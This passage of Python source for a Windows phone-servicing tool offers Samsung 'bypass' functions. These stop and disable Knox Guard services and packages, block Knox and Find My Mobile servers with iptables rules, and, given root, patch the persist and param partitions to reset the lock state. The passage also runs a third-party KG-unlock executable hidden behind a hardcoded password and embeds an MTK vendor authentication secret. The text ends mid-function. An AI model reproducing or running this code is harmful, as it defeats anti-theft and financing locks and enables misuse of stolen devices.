        self.log('QR Provisioning popup opened', 's')

    def _final_patches(self):
        if not self._ensure_active(): return
        self.log_section('Final Patches — UFS Relock Prevention', 2)
        adb = self._find_adb()
        if not adb: self.log('ADB not found', 'e'); return
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials: self.log('No device found', 'e'); return
        s = serials[0]; flags = 0x08000000
        raw = ''
        for _attempt in range(3):
            try:
                raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=30, creationflags=flags).stdout
                if raw.strip():
                    break
            except Exception:
                pass
            if _attempt < 2:
                subprocess.run([adb, 'kill-server'], timeout=5, capture_output=True)
                subprocess.run([adb, 'start-server'], timeout=10, capture_output=True)
                time.sleep(2)
        if not raw.strip():
            self.log('Device not responding — check USB connection', 'e'); return
        p = {}
        for line in raw.split('\n'):
            if ']: [' in line:
                k, v = line.strip()[1:].split(']: [', 1)
                p[k] = v.rstrip(']')
        def g(*keys):
            for k in keys:
                v = p.get(k, '')
                if v: return v
                try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                except Exception: pass
                if v: p[k] = v; return v
            return ''
        model = g("ro.product.model", "").upper()
        r_stor = subprocess.run([adb, '-s', s, 'shell', 'test -d /sys/bus/ufs/devices && echo UFS || (ls /sys/block/ 2>/dev/null | grep -q mmcblk && echo MMC || (getprop ro.boot.bootdevice 2>/dev/null | grep -qi ufs && echo UFS || echo MMC))'],
                                capture_output=True, text=True, timeout=5, creationflags=flags)
        storage_type = r_stor.stdout.strip()
        if 'SM-A15' in model or 'SM-A16' in model:
            self.log(f'Model {model} — forcing UFS mode', 'i')
            storage_type = 'UFS'
        self.log(f'Storage: {storage_type}', 'i')
        if storage_type == 'UFS':
            self.log('UFS detected — applying relock patches...', 'i')
        else:
            self.log('eMMC detected — applying relock patches...', 'i')
        self._samsung_hardening()


    def samsung_tool(self):
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=40)
        
        tk.Label(cw, text='Samsung', font=('Segoe UI', 22, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 4))
        tk.Label(cw, text='Select bypass method below',
                font=('Segoe UI', 11), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))
        
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))
        
        row1 = tk.Frame(cw, bg=self.c['bg'])
        row1.pack(pady=4)
        self._mkbtn(row1, 'Samsung One-Click',
              lambda: self._run_thread(self._samsung_full_bypass, 'Samsung One-Click'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        self._mkbtn(row1, 'Samsung 2023-2024',
              lambda: self._run_thread(self._samsung_bypass_2023, 'Samsung 2023-2024'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        self._mkbtn(row1, 'Samsung QR Provision',
              lambda: self._run_thread(self._samsung_qr_provision, 'Samsung QR Provision'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))
        row2 = tk.Frame(cw, bg=self.c['bg'])
        row2.pack(pady=4)
        self._mkbtn(row2, 'ADD FINAL PATCHES',
              lambda: self._run_thread(self._final_patches, 'Final Patches'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
    
    def _show_device_info_full(self, adb, s, flags=0x08000000):
        raw = ''
        for _attempt in range(3):
            try:
                raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=15, creationflags=flags).stdout
                if raw.strip():
                    break
            except Exception:
                pass
            if _attempt < 2:
                subprocess.run([adb, 'kill-server'], timeout=5, capture_output=True)
                subprocess.run([adb, 'start-server'], timeout=10, capture_output=True)
                time.sleep(2)
        if not raw.strip():
            self.log('Device not responding — check USB connection', 'e')
            return None
        p = {}
        for line in raw.split('\n'):
            if ']: [' in line:
                k, v = line.strip()[1:].split(']: [', 1)
                p[k] = v.rstrip(']')
        def g(*keys):
            for k in keys:
                v = p.get(k, '')
                if v: return v
                try: v = subprocess.run([adb, '-s', s, 'shell', 'getprop', k], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                except Exception: pass
                if v: p[k] = v; return v
            return ''
        def sh(cmd):
            try:
                r = subprocess.run([adb, '-s', s, 'shell', cmd], capture_output=True, text=True, timeout=5, creationflags=flags)
                return (r.stdout or '').strip()
            except Exception: return ''
        model = g('ro.product.model')
        csc = g('ro.csc.sales_code')
        samfw_url = f'https://samfw.com/firmware/{model}/{csc}' if model and csc else ''
        imei1 = sh('dumpsys iphonesubinfo 2>/dev/null | grep -im1 "imei" | cut -d= -f2')
        if not imei1: imei1 = sh('service call iphonesubinfo 1 2>/dev/null | grep -oE "[0-9]{15}" | head -1')
        if not imei1: imei1 = sh('service call iphonesubinfo 4 i32 0 2>/dev/null | grep -oE "[0-9]{15}" | head -1')
        if not imei1: imei1 = sh('dumpsys telephony.registry 2>/dev/null | grep -i imei | grep -oE "[0-9]{15}" | head -1')
        bb = sh('getprop gsm.version.baseband 2>/dev/null')
        cp = bb.split(',')[0] if bb and ',' in bb else bb
        kg_val = sh('getprop ro.boot.kgstatus 2>/dev/null') or g('persist.sys.kg.state') or g('ro.boot.kg') or ''
        wmac = sh('dumpsys wifi 2>/dev/null | grep -iE "mMacAddress|macAddress" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | head -1')
        if not wmac: wmac = sh('getprop persist.sys.wifi.mac 2>/dev/null')
        if not wmac: wmac = sh('cat /sys/class/net/wlan0/address 2>/dev/null')
        simst = sh('dumpsys telephony.registry 2>/dev/null | grep -i mSimState | cut -d= -f2 | head -1 | tr -d " "')


        return {'g': g, 'sh': sh, 'p': p, 's': s}

    def _samsung_bypass_2023(self):
        self._block_close = True
        try:
            if not self._ensure_active(): return
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                self.log('Run as Administrator first!', 'e')
                return
            tools = self._tools_dir()
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.log_section('MDM KING IS PROCESSING', 2)
            self._enqueue_ui(lambda: self._update_progress(0, 3, '...', 'running'))

            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            self._build_progress_ui('SAMSUNG 2023-2024', 3, ['Device Info', 'BYPASSING', 'Done'])
            self._enqueue_ui(lambda: self._show_progress('SAMSUNG 2023-2024'))
            self._enqueue_ui(lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            self._enqueue_ui(lambda: self._update_progress(0, 3, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self._enqueue_ui(lambda: self._update_progress(0, 3, '...', 'done'))

            self._enqueue_ui(lambda: self._update_progress(1, 3, 'BYPASSING', 'running'))
            roby_dir = os.path.join(tools, 'robytech', 'ALL SAMSUNG KG LOCK FIX BY ROBYTECH')
            roby_exe = os.path.join(roby_dir, 'ALL SAMSUNG KG LOCK FIX BY ROBYTECH.exe')
            if not os.path.isfile(roby_exe):
                self.log('exe not found', 'e'); return
            self.log('Running tool...', 'i')
            try:
                import ctypes, time
                from ctypes import wintypes
                user32 = ctypes.windll.user32
                SW_HIDE = 0
                WM_SETTEXT = 0x000C
                si = subprocess.STARTUPINFO()
                si.dwFlags = subprocess.STARTF_USESHOWWINDOW
                si.wShowWindow = SW_HIDE
                p = subprocess.Popen([roby_exe], cwd=roby_dir, startupinfo=si,
                                     creationflags=subprocess.CREATE_NO_WINDOW)

                hwnd = None
                for _ in range(60):
                    hwnd = user32.FindWindowW(None, 'Password prompt')
                    if hwnd:
                        edit = user32.FindWindowExW(hwnd, None, 'Edit', None)
                        if edit:
                            user32.SendMessageW(edit, WM_SETTEXT, 0, 'ROBYTECH1234')
                        btn = user32.FindWindowExW(hwnd, None, 'Button', None)
                        if btn:
                            btn_id = user32.GetDlgCtrlID(btn)
                            user32.PostMessageW(hwnd, 0x0111, btn_id, 0)
                        else:
                            user32.PostMessageW(hwnd, 0x0111, 1, 0)
                        user32.ShowWindow(hwnd, SW_HIDE)
                        break
                    time.sleep(0.1)

                dots = ['.', '..', '...', '....', '.....', '......']
                dot_idx = [0]
                def animate():
                    self._enqueue_ui(lambda i=dot_idx[0]: self._update_progress(1, 3, dots[i % len(dots)], 'running'))
                    dot_idx[0] += 1
                    if not done[0]:
                        self.root.after(800, animate)

                done = [False]
                self._enqueue_ui(animate)
                p.wait()
                time.sleep(1.5)
                done[0] = True
            except Exception as e:
                self.log('Error: ' + str(e), 'e')

            self._enqueue_ui(lambda: self._update_progress(2, 3, '...', 'done'))
            self._enqueue_ui(lambda: self._finish_progress(True, 'SAMSUNG 2023 BYPASS COMPLETE'))
        finally:
            self._block_close = False
    
    def _kg_state_manipulate(self):
        """Read and manipulate Samsung KG (Knox Guard) state via ADB."""
        self._block_close = True
        try:
            if not self._ensure_active(): return
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device connected', 'e'); return
            s = devs[0]; flags = 0x08000000

            def sh(cmd):
                try:
                    rr = subprocess.run([adb, '-s', s, 'shell', cmd], capture_output=True, text=True, timeout=8, creationflags=flags)
                    return (rr.stdout or '').strip()
                except: return ''
            def g(prop):
                return sh(f'getprop {prop} 2>/dev/null')

            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.log_section('KG STATE MANIPULATION', 2)
            self.log('Phone must be ON with USB debugging enabled', 'i')
            self.log(f'Device: {s}', 'i')

            # Read current KG state from all sources
            kg_props = {
                'ro.boot.kgstatus': g('ro.boot.kgstatus'),
                'persist.sys.kg.state': g('persist.sys.kg.state'),
                'gsm.KG': g('gsm.KG'),
                'ril.kgstatus': g('ril.kgstatus'),
                'ro.boot.kg': g('ro.boot.kg'),
                'persist.sys.kg': g('persist.sys.kg'),
            }
            kg_settings = {
                'global kg_status': sh('settings get global kg_status 2>/dev/null'),
                'secure kg_status': sh('settings get secure kg_status 2>/dev/null'),
                'global knox_guard_status': sh('settings get global knox_guard_status 2>/dev/null'),
                'secure knox_guard_status': sh('settings get secure knox_guard_status 2>/dev/null'),
            }
            kg_active = sh('ps -A 2>/dev/null | grep -i knoxguard') or 'not running'
            self.log('═' * 40, 'h')
            self.log('Current KG State:', 'h')
            for k, v in kg_props.items():
                if v: self.log(f'  {k} = {v}', 'c')
            for k, v in kg_settings.items():
                if v: self.log(f'  settings {k} = {v}', 'c')
            self.log(f'  knoxguard process: {kg_active}', 'c')

            # Determine current state
            current_state = ''
            for v in kg_props.values():
                if v and v.lower() in ('prenormal', 'checking', 'completed', 'normal', 'locked', 'allzero', 'broken'):
                    current_state = v.lower()
                    break
            if current_state:
                self.log(f'Current KG state: {current_state.upper()}', 's')
            else:
                self.log('Current KG state: UNKNOWN', 'o')

            self.log('═' * 40, 'h')
            self.log('Step 1: Stopping knoxguard service...', 'i')
            for cmd in ['setprop ctl.stop knoxguard', 'setprop ctl.stop kgclient',
                         'stop knoxguard 2>/dev/null', 'killall knoxguard 2>/dev/null',
                         'killall kgclient 2>/dev/null']:
                sh(cmd)
            time.sleep(1)

            self.log('Step 2: Clearing KG settings...', 'i')
            for cmd in ['settings delete global knox_guard_status',
                         'settings delete secure knox_guard_status',
                         'settings delete global kg_status',
                         'settings delete secure kg_status',
                         'settings delete global kg_state',
                         'settings delete secure kg_state']:
                sh(cmd)

            self.log('Step 3: Setting persist KG state to checking...', 'i')
            state_targets = ['checking', 'prenormal', '']
            chosen = 'checking'
            for st in state_targets:
                for prop in ['persist.sys.kg.state', 'persist.sys.kg', 'persist.security.kg']:
                    if st:
                        sh(f'setprop {prop} {st}')
                    else:
                        sh(f'setprop {prop} ""')
            self.log(f'  Set persist KG state to: {chosen}', 's')

            self.log('Step 4: Blocking KG server connections...', 'i')
            for rule in [
                '-A OUTPUT -m string --string "knox" --algo bm -j DROP',
                '-A OUTPUT -m string --string "samsungdm" --algo bm -j DROP',
                '-A OUTPUT -m string --string "samsungknox" --algo bm -j DROP',
                '-A OUTPUT -m string --string "findmymobile" --algo bm -j DROP',
                '-A OUTPUT -m string --string "samsungcloud" --algo bm -j DROP',
                '-A OUTPUT -m string --string "samsungaccount" --algo bm -j DROP',
            ]:
                sh(f'iptables {rule} 2>/dev/null')
            self.log('  KG servers blocked', 's')

            self.log('Step 5: Disabling KG/Knox packages...', 'i')
            kg_pkgs = ['com.samsung.android.knox.zt.framework', 'com.samsung.android.knox.zt.config',
                       'com.samsung.android.knox.zt', 'com.samsung.android.knox.kpec',
                       'com.samsung.android.knox.analytics', 'com.samsung.android.knox.attestation',
                       'com.samsung.android.knox.containeragent', 'com.samsung.android.knox.pushmanager',
                       'com.sec.enterprise.knox.cloudmdm.smdms', 'com.samsung.android.knox.enrollment',
                       'com.samsung.knox.appops', 'com.samsung.knox.kcetest',
                       'com.samsung.android.kgclient', 'com.samsung.klmsagent']
            pkgs_out = sh('pm list packages 2>/dev/null')
            disabled = 0
            for pkg in kg_pkgs:
                if pkg in pkgs_out:
                    sh(f'pm disable-user --user 0 {pkg} 2>/dev/null')
                    disabled += 1
            self.log(f'  {disabled} Knox/KG packages disabled', 's')

            # Root-level partition manipulation (attempt)
            self.log('Step 6: Attempting persist partition modification (requires root)...', 'i')
            has_root = sh('su -c "id" 2>/dev/null') or ''
            if 'uid=0' in has_root or 'root' in has_root.lower():
                self.log('  Root access available! Attempting persist partition patch...', 's')
                persist_dev = sh('ls -la /dev/block/by-name/persist 2>/dev/null | grep -o "/dev/.*"')
                if not persist_dev:
                    persist_dev = sh('ls -la /dev/block/platform/*/by-name/persist 2>/dev/null | grep -o "/dev/.*"')
                if persist_dev:
                    self.log(f'  Found persist partition: {persist_dev}', 's')
                    tmp = '/data/local/tmp/persist_kg.img'
                    sh(f'su -c "dd if={persist_dev} of={tmp} bs=1M 2>/dev/null"')
                    sh(f'su -c "chmod 666 {tmp}"')
                    local = os.path.join(tempfile.gettempdir(), 'persist_kg.img')
                    subprocess.run([adb, '-s', s, 'pull', tmp, local], timeout=30, capture_output=True, creationflags=flags)
                    if os.path.isfile(local) and os.path.getsize(local) > 1024:
                        with open(local, 'rb') as f: data = bytearray(f.read())
                        modified = False
                        for old, new in [(b'prenormal', b'checking\x00'), (b'locked\x00\x00\x00\x00', b'checking\x00\x00\x00'),
                                          (b'completed', b'checking\x00'), (b'\x00kg_state\x00', b'\x00kg_state\x00')]:
                            idx = data.find(old)
                            if idx >= 0:
                                data[idx:idx+len(new)] = new
                                modified = True
                                self.log(f'  Patched "{old.decode(errors="replace")}" at offset {idx}', 's')
                        if modified:
                            with open(local, 'wb') as f: f.write(data)
                            subprocess.run([adb, '-s', s, 'push', local, tmp], timeout=30, capture_output=True, creationflags=flags)
                            sh(f'su -c "dd if={tmp} of={persist_dev} bs=1M 2>/dev/null"')
                            self.log('  Persist partition patched successfully!', 's')
                        else:
                            self.log('  No KG state strings found in persist partition', 'o')
                        try: os.remove(local)
                        except: pass
                    sh(f'su -c "rm -f {tmp}"')
                else:
                    self.log('  Persist partition not found, trying param partition...', 'o')
                    param_dev = sh('ls -la /dev/block/by-name/param 2>/dev/null | grep -o "/dev/.*"')
                    if param_dev:
                        self.log(f'  Found param partition: {param_dev}', 's')
                        tmp = '/data/local/tmp/param_kg.img'
                        sh(f'su -c "dd if={param_dev} of={tmp} bs=1M 2>/dev/null"')
                        sh(f'su -c "chmod 666 {tmp}"')
                        local = os.path.join(tempfile.gettempdir(), 'param_kg.img')
                        subprocess.run([adb, '-s', s, 'pull', tmp, local], timeout=30, capture_output=True, creationflags=flags)
                        if os.path.isfile(local) and os.path.getsize(local) > 1024:
                            with open(local, 'rb') as f: data = bytearray(f.read())
                            modified = False
                            for old in [b'prenormal', b'locked', b'completed']:
                                idx = data.find(old)
                                if idx >= 0:
                                    data[idx:idx+len(b'checking')] = b'checking'
                                    modified = True
                                    self.log(f'  Patched "{old.decode()}" in param at offset {idx}', 's')
                            if modified:
                                with open(local, 'wb') as f: f.write(data)
                                subprocess.run([adb, '-s', s, 'push', local, tmp], timeout=30, capture_output=True, creationflags=flags)
                                sh(f'su -c "dd if={tmp} of={param_dev} bs=1M 2>/dev/null"')
                                self.log('  Param partition patched successfully!', 's')
                            try: os.remove(local)
                            except: pass
                        sh(f'su -c "rm -f {tmp}"')
                    else:
                        self.log('  No root access or partitions not found', 'o')
            else:
                self.log('  No root access — skipping partition modification', 'o')
                self.log('  ADB root session might help: "adb root"', 'i')

            self.log('═' * 40, 'h')
            self.log('KG state manipulation complete!', 's')
            self.log('A reboot is recommended for changes to take effect.', 'i')
            self._enqueue_ui(lambda: self.log_text.insert(tk.END, '\n[!] Reboot device to apply changes\n', 'e'))
            self._enqueue_ui(lambda: self.log_text.see(tk.END))

        finally:
            self._block_close = False

    def _mkbtn(self, parent, text, cmd, wide=False, state=tk.NORMAL, **kw):
        bg = kw.pop('bg', self.c['accent'])
        fg = kw.pop('fg', '#000')
        padx = kw.setdefault('padx', 24 if wide else 10)
        pady = kw.setdefault('pady', 6)
        font = ('Segoe UI', 8, 'bold')
        tw = max(len(text) * 9 + padx, 80)
        th = 44
        can = tk.Canvas(parent, width=tw, height=th, bg=self.c['bg'],
                        highlightthickness=0, cursor='hand2')
        r = 6
        x1, y1, x2, y2 = 2, 2, tw-2, th-2
        pts = [x1+r, y1, x1+r, y1, x2-r, y1, x2-r, y1, x2, y1,
               x2, y1+r, x2, y1+r, x2, y2-r, x2, y2-r, x2, y2,
               x2-r, y2, x2-r, y2, x1+r, y2, x1+r, y2, x1, y2,
               x1, y2-r, x1, y2-r, x1, y1+r, x1, y1+r, x1, y1]
        rect = can.create_polygon(pts, smooth=True, splinesteps=10000, fill=bg, outline='')
        tid = can.create_text(tw/2, th/2, text=text, font=font, fill=fg, anchor='center')
        can._disabled = (state == tk.DISABLED)
        can._rect_id = rect; can._text_id = tid
        can.bind('<Button-1>', lambda e: (cmd() if not can._disabled else None))
        _orig_cfg = can.config
        def _wrap_cfg(**kw2):
            if 'bg' in kw2: can.itemconfig(can._rect_id, fill=kw2['bg'])
            if 'text' in kw2: can.itemconfig(can._text_id, text=kw2['text'])
            if 'state' in kw2: can._disabled = (kw2['state'] == tk.DISABLED)
            rest = {k: v for k, v in kw2.items() if k not in ('state', 'bg', 'text')}
            if rest: _orig_cfg(**rest)
        can.config = _wrap_cfg
        return can

    def _cancel_operation(self):
        self._cancel = True
        subprocess.run(['taskkill', '/F', '/IM', 'adb.exe'], capture_output=True)
        self.log('Cancelled', 'w')
        if hasattr(self, '_prog_frame'):
            self.root.after(0, lambda: self._finish_progress(False, 'CANCELLED'))

    def _reboot_device(self):
        def reboot():
            r = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=5)
            for l in r.stdout.split('\n')[1:]:
                if l.strip() and 'device' in l:
                    s = l.split()[0]
                    subprocess.run(['adb', '-s', s, 'shell', 'reboot'], timeout=30, capture_output=True)
                    self.log('Rebooting device...', 'i')
                    return
            self.log('No device found', 'e')
        threading.Thread(target=reboot, daemon=True).start()

    def _adb_push_busybox(self):
        adb = self._find_adb()
        bbox_src = _asset('ANDROID_Res', 'BusyBox', 'busybox.arm')
        if not os.path.isfile(bbox_src):
            bbox_src = _asset('ANDROID_Res', 'BusyBox', 'busybox.mps')
        if not os.path.isfile(bbox_src):
            messagebox.showerror('Not Found',
                'BusyBox binary not found.\n\n'
                'Place busybox.arm or busybox.mps in:\n'
                + _asset('ANDROID_Res', 'BusyBox'),
                parent=self.root)
            return
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=10)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials:
            messagebox.showerror('No Device', 'ADB device not found.', parent=self.root)
            return
        s = serials[0]
        self.log('Pushing BusyBox to device...', 'i')
        subprocess.run([adb, '-s', s, 'push', bbox_src, '/data/local/tmp/busybox'], timeout=30, capture_output=True)
        subprocess.run([adb, '-s', s, 'shell', 'chmod 755 /data/local/tmp/busybox'], timeout=10, capture_output=True)
        v = subprocess.run([adb, '-s', s, 'shell', '/data/local/tmp/busybox --help'], capture_output=True, text=True, timeout=10)
        if v.returncode == 0:
            self.log('BusyBox pushed to device', 's')
            messagebox.showinfo('Done', 'BusyBox installed at /data/local/tmp/busybox', parent=self.root)
        else:
            self.log('BusyBox push failed', 'e')
            messagebox.showerror('Failed', v.stdout + v.stderr, parent=self.root)

    def _spd_install_driver(self):
        spd_root = _asset('SPD_Driver_R4.20.4201')
        if not os.path.isdir(spd_root):
            messagebox.showerror('Not Found',
                f'SPD driver package not found at:\n{spd_root}', parent=self.root)
            return
        import platform as _pf
        arch = _pf.machine().lower()
        win_ver = 'Win10'
        if os.path.isdir(os.path.join(spd_root, 'Win10')):
            win_ver = 'Win10'
        elif os.path.isdir(os.path.join(spd_root, 'Win8')):
            win_ver = 'Win8'
        elif os.path.isdir(os.path.join(spd_root, 'Win7')):
            win_ver = 'Win7'
        driver_dir = os.path.join(spd_root, win_ver)
        self.log('Launching SPD driver installer (elevated)...', 'i')
        import ctypes
        dpinst = os.path.join(driver_dir, 'DPInst64.exe' if '64' in arch else 'DPInst32.exe')
        if os.path.isfile(dpinst):
            self.log(f'Running: {dpinst} /se /sw', 'i')
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', dpinst, '/se /sw', None, 1)
        setup = os.path.join(driver_dir, 'DriverSetup.exe')
        if os.path.isfile(setup):
            ctypes.windll.shell32.ShellExecuteW(None, 'runas', setup, '', None, 1)
        self.log('SPD driver install launched', 'i')
        messagebox.showinfo('Done', 'SPD driver installer launched with admin rights.\n\n'
            'Accept any UAC prompts that appear.\n'
            'Reconnect the SPD device after installing.',
            parent=self.root)

    def _meta_tool(self):
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=40)

        tk.Label(cw, text='META MODE', font=('Segoe UI', 22, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 2))
        self._meta_label = tk.Label(cw, text='Connect MTK phone and click an action',
                font=('Segoe UI', 12), fg=self.c['muted'], bg=self.c['bg'])
        self._meta_label.pack(pady=20)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(14, 18))

        btnf = tk.Frame(cw, bg=self.c['bg'])
        btnf.pack(pady=20)

        mtk = __import__('shutil').which('mtk')
        if mtk:
            self._mkbtn(btnf, 'FACTORY RESET',
                lambda: self._run_thread(self._meta_factory_reset, 'META FR'),
                wide=True, padx=20, pady=10).pack(side=tk.LEFT, padx=6)
            self._mkbtn(btnf, 'RESET FRP',
                lambda: self._run_thread(self._meta_reset_frp, 'META FRP'),
                wide=True, padx=20, pady=10).pack(side=tk.LEFT, padx=6)
            self._mkbtn(btnf, 'READ INFO',
                lambda: self._run_thread(self._meta_read_device_info, 'META Info'),
                wide=True, padx=20, pady=10).pack(side=tk.LEFT, padx=6)
        else:
            self.log('[META] mtk tool not found! Install mtkclient:', 'e')
            self.log('  pip install mtkclient', 'e')
            self.log('  Or download from: https://github.com/bkerler/mtkclient', 'e')
            self.root.after(0, lambda: self._meta_label.config(
                text='mtk tool not installed', fg=self.c['red']))

    def _meta_scan_usb(self):
        """Deep USB scan for MTK devices using minimal PowerShell calls."""
        mtk_info = {}
        self._meta_com_port = None

        # PID priority: META > DA > BROM > PreLoader > unknown
        meta_pids = {'0003', '0001', '2007', '2008', '2009', '2010', '2011', '2012'}
        da_pids = {'2001', '200d', '2014'}
        brom_pids = {'2006', '2015', '2002', '200a'}
        preloader_pids = {'2000', '200c', '2013', '2019', '2339'}
        known_pids = meta_pids | da_pids | brom_pids | preloader_pids

        def _priority(pid):
            if pid in meta_pids: return 0
            if pid in da_pids: return 1
            if pid in brom_pids: return 2
            if pid in preloader_pids: return 3
            return 4

        def _update_best(name, hwid, friendly_name=''):
            nonlocal mtk_info
            m = re.search(r'PID_([0-9A-Fa-f]{4})', hwid)
            if not m:
                return
            pid = m.group(1).lower()
            if pid not in known_pids and pid != '????':
                return
            # Extract COM port from FriendlyName
            com_port = None
            fn = friendly_name or name
            cm = re.search(r'\(COM(\d+)\)', fn)
            if cm:
                com_port = f'COM{cm.group(1)}'
            best_pid = mtk_info.get('pid', '')
            if not best_pid or _priority(pid) < _priority(best_pid):
                mtk_info = {
                    'pid': pid, 'name': fn,
                    'com_port': com_port,
                }
            elif not mtk_info.get('com_port') and com_port:
                mtk_info['com_port'] = com_port

        # Single PowerShell call: get ALL devices with VID_0E8D
        try:
            r = subprocess.run(
                ['powershell', '-NoProfile', '-Command',
                 'Get-PnpDevice | Where-Object { ($_.HardwareID -join " ") -match "VID_0E8D" } | '
                 'Select-Object Status, FriendlyName, HardwareID, Problem, Class | ConvertTo-Json -Compress'],
                capture_output=True, text=True, timeout=15)
            if r.stdout.strip() and r.stdout.strip() != 'null':
                data = json.loads(r.stdout)
                if not isinstance(data, list): data = [data]
                for item in data:
                    hwid_raw = item.get('HardwareID', [])
                    hwid = ' '.join(hwid_raw) if isinstance(hwid_raw, list) else str(hwid_raw)
                    name = item.get('FriendlyName', '')
                    _update_best(name, hwid, name)
                    # Check problem devices
                    problem = item.get('Problem', None)
                    if problem and problem != 0:
                        mtk_info['has_problem'] = True
        except Exception:
            pass

        # pyserial fallback: scan COM ports if PowerShell didn't find one
        if not mtk_info.get('com_port'):
            try:
                import serial.tools.list_ports
                for port_info in serial.tools.list_ports.comports():
                    hw = (port_info.hwid or '').upper()
                    if '0E8D' in hw:
                        mtk_info['com_port'] = port_info.device
                        if not mtk_info.get('name'):
                            mtk_info['name'] = port_info.description or port_info.device
                        break
            except ImportError:
                pass

        self._meta_com_port = mtk_info.get('com_port')
        return mtk_info

    def _meta_enter_via_serial(self, mode='METAMETA', forced_port=None):
        """Enter META mode via PreLoader VCOM serial (stock method, no BROM exploit).

        Flow:
          1. Open PreLoader VCOM port
          2. Wait for READY, send mode string (e.g. METAMETA)
          3. If device responds with ATEMATEM -> ACK sequence -> DISCONNECT (done)
          4. If device responds with METASLA -> SLA challenge-response -> ATEM0001 -> ATEM0002 -> ATEMATEX -> DISCONNECT
          5. Device reboots into META mode
        """
        try:
            import serial
            import serial.tools.list_ports
            import hashlib
        except ImportError:
            self.log('  pyserial not installed — pip install pyserial', 'w')
            return False

        mtk_vid = '0E8D'
        mode_bytes = {
            'METAMETA': b'METAMETA', 'ADVEMETA': b'ADVEMETA',
            'FASTBOOT': b'FASTBOOT', 'FACT': b'FACTFACT', 'ATE': b'FACTORYM',
        }

        INFINIX_SECRET = bytes([
            0x7C, 0x34, 0xE1, 0x89, 0x12, 0xE1, 0xCD, 0x3D, 0x56, 0x31, 0xAD, 0xB2,
            0x24, 0x76, 0xD3, 0x12, 0x34, 0xE2, 0xCA, 0xFD, 0x13, 0x12, 0x3D, 0x2B,
            0x3B, 0x13, 0xE1, 0x57, 0x22, 0xAD, 0xC1, 0x1D, 0x3D, 0x34, 0xFD, 0x3D,
            0x1A, 0x57, 0x46, 0x1A, 0x35, 0x13, 0xC4, 0xAF, 0x5A, 0x86, 0x22, 0x45,
            0x9D, 0x3D, 0xD1, 0x46, 0x72, 0x41, 0x4F, 0xAD, 0x46, 0xAD, 0x53, 0x11,
            0xC2, 0x3B, 0x3D, 0x2D, 0x1A, 0x2F, 0x3D, 0xFA, 0xDF, 0x35, 0x57, 0x24,
            0xA7, 0x4D, 0x5E, 0x4F, 0x34, 0xD3, 0x4F, 0x2D, 0xDF, 0x1F, 0x13, 0xD3,
            0xB2, 0x91, 0x41, 0x3D, 0x4F, 0xD1, 0x5D, 0x91, 0xFD, 0x2E, 0x4D, 0x6F,
            0x3D, 0x41, 0x34, 0x7F, 0x45, 0xF3, 0x8A, 0x26, 0x1A, 0x33, 0x4F, 0x3E,
            0x5E, 0x64, 0x36, 0x8A, 0xD1, 0xF6, 0x9F, 0x35, 0x6A, 0x96, 0x2A, 0x5D,
        ])

        def _find_port():
            if forced_port:
                return forced_port
            for info in serial.tools.list_ports.comports():
                hw = (info.hwid or '').upper()
                if mtk_vid in hw:
                    return info.device
            return None

        def _drain(ser, buf, markers, timeout=5):
            end = time.time() + timeout
            while time.time() < end:
                try:
                    data = ser.read(64)
                except Exception:
                    data = b''
                if data:
                    buf += data
                for m in markers:
                    if m in buf:
                        return m, buf
            return None, buf

        def _sla_handshake(ser):
            """Handle SLA (Secure Login Authentication) challenge-response."""
            ser.write(b'SLASTART')
            buf = b''
            end = time.time() + 6
            while time.time() < end:
                try:
                    data = ser.read(1)
                except Exception:
                    data = b''
                if data:
                    buf += data
                    if b'RANDOM' in buf:
                        break
            if b'METAFORB' in buf:
                return False
            if b'RANDOM' not in buf:
                return False

            resp = buf
            if b'SHA' in resp:
                timeval = resp[6:10]
                keyid = int.from_bytes(resp[13:17], 'little')
                key = INFINIX_SECRET[0xC * keyid:0xC * keyid + 0xC]
                ser.write(hashlib.sha256(timeval + key).digest())
            else:
                vendor = 'tecno' if b'EXT' in resp else 'infinix'
